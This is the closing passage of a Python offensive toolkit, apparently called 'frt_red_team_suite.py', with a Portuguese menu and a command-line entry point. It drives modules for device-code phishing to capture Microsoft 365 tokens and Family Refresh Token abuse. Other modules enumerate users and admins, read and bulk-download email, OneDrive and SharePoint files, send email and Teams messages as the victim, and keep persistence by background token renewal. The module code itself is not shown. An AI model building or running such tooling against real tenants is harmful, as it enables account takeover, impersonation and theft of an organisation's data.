  [34] Enumerar Teams                  [35] Coleta rápida (tudo)
  [36] Calendário (30 dias)            [37] Contatos
  [38] Service Principals              [39] Applications registradas

  ── FASE 4: PERSISTÊNCIA ─────────────────────────────────────────────────
  [40] Configurar renovação + background thread
  [41] Status de persistência    [42] Info: PRT / dispositivo virtual

  ── AÇÕES ATIVAS ─────────────────────────────────────────────────────────
  [60] Enviar email              [61] Baixar emails (.eml/.json)
  [62] Enviar msg Teams (canal)  [63] Ver mensagens Teams (canal/DM)
  [64] Enviar DM direto Teams    [65] Baixar arquivo OneDrive
  [66] Download em lote OneDrive

  ── SHAREPOINT ───────────────────────────────────────────────────────────
  [70] Listar sites              [71] Listar arquivos do site
  [72] Baixar arquivo SharePoint

  ── RELATÓRIOS ───────────────────────────────────────────────────────────
  [50] Gerar relatório HTML rico + JSON
  [51] Ver logs / sessões        [52] Limpar dados coletados

  [99] Sair
  ─────────────────────────────────────────────────────────────────────────
"""


class FRTMenu:
    def __init__(self):
        ensure_dirs()
        Logger.init_session()
        self.tm      = TokenManager()
        self.renewer = BackgroundRenewer(self.tm)
        self.ph      = PhishingModule(self.tm)
        self.frt     = FRTAnalyzer(self.tm)
        self.exp     = ExploitationModule(self.tm)
        self.intel   = IntelModule(self.tm)
        self.recon   = TenantReconModule(self.tm)
        self.per     = PersistenceModule(self.tm, self.renewer)
        self.acao    = AcoesAtivasModule(self.tm)
        self.sp      = SharePointModule(self.tm)
        self.util    = UtilsModule()

    def run(self):
        print(BANNER)
        if self.tm.has_tokens:
            data = self.tm.get_active_data()
            email = (data or {}).get("user_email","?")
            log.ok(f"Tokens carregados — ativo: {email}")
            self.renewer.start()
        else:
            log.warn("Nenhum token. Use [1] para carregar ou [10] para capturar.")

        while True:
            print(MENU_TEXTO)
            try: choice = input("  [?] Opção: ").strip()
            except (KeyboardInterrupt, EOFError): break
            print()
            try:
                if   choice=="1":  self.tm.load_tokens()
                elif choice=="2":  self.tm.list_tokens()
                elif choice=="3":  self.tm.renew_token()
                elif choice=="4":  self.tm.validate_tokens()
                elif choice=="5":  self.tm.backup_tokens()
                elif choice=="10": self.ph.device_code_flow_real()
                elif choice=="11": self.ph.gerar_phishing_url()
                elif choice=="20": self.frt.analisar_frt()
                elif choice=="21": self.frt.ver_analise_anterior()
                elif choice=="30": self.exp.enumerar_usuarios()
                elif choice=="31": self.exp.encontrar_admins()
                elif choice=="32": self.exp.ler_emails()
                elif choice=="33": self.exp.listar_onedrive()
                elif choice=="34": self.exp.enumerar_teams()
                elif choice=="35": self.exp.coleta_rapida()
                elif choice=="36": self.intel.calendario()
                elif choice=="37": self.intel.contatos()
                elif choice=="38": self.recon.service_principals()
                elif choice=="39": self.recon.aplicacoes_registradas()
                elif choice=="40": self.per.configurar_renovacao()
                elif choice=="41": self.per.status_persistencia()
                elif choice=="42": self.per.criar_dispositivo_virtual()
                elif choice=="50": self.util.gerar_relatorio()
                elif choice=="51": self.util.ver_logs()
                elif choice=="52": self.util.limpar_dados()
                elif choice=="60": self.acao.enviar_email()
                elif choice=="61": self.acao.baixar_emails()
                elif choice=="62": self.acao.enviar_mensagem_teams()
                elif choice=="63": self.acao.ver_mensagens_teams()
                elif choice=="64": self.acao.enviar_dm_teams()
                elif choice=="65": self.acao.baixar_arquivo_onedrive()
                elif choice=="66": self.acao.download_lote_onedrive()
                elif choice=="70": self.sp.listar_sites()
                elif choice=="71": self.sp.listar_arquivos_site()
                elif choice=="72": self.sp.baixar_arquivo_sharepoint()
                elif choice=="99":
                    self.renewer.stop(); RunMode.flush_json()
                    print("  Saindo... 🔐"); break
                else: log.warn(f"Opção inválida: {choice}")
            except KeyboardInterrupt: print("\n  [*] Abortado")
            except Exception as e:
                log.error(f"Erro inesperado: {e}")
                import traceback; traceback.print_exc()
            input("\n  [*] ENTER para continuar...")
            print("\033[2J\033[H", end=""); print(BANNER)


# ═══ ENTRY POINT — melhoria #10 (--silent / --json-output) ═══════════════════
if __name__ == "__main__":
    args = sys.argv[1:]

    if "--silent" in args:
        RunMode.silent = True; args.remove("--silent")
    if "--json-output" in args:
        RunMode.json_output = True; RunMode.silent = True; args.remove("--json-output")

    if args:
        arg = args[0]; tm = TokenManager()
        if arg == "--renew":
            tm.renew_token(); RunMode.flush_json()
        elif arg == "--status":
            tm.list_tokens(); RunMode.flush_json()
        elif arg == "--capture":
            PhishingModule(tm).device_code_flow_real(); RunMode.flush_json()
        elif arg == "--vault":
            tm.vault.list_vault()
        elif arg == "--report":
            UtilsModule.gerar_relatorio(); RunMode.flush_json()
        elif arg == "--help":
            print("""
Uso: python frt_red_team_suite.py [FLAGS] [COMANDO]

FLAGS:
  --silent        Suprime output colorido
  --json-output   Saída JSON estruturada (implica --silent)

COMANDOS:
  --renew         Renovar token ativo
  --status        Listar tokens carregados
  --capture       Capturar via Device Code Flow
  --vault         Listar Token Vault
  --report        Gerar relatório
  --help          Esta ajuda

Sem argumentos: menu interativo
""")
        else:
            print(f"Desconhecido: {arg}. Use --help")
    else:
        FRTMenu().run()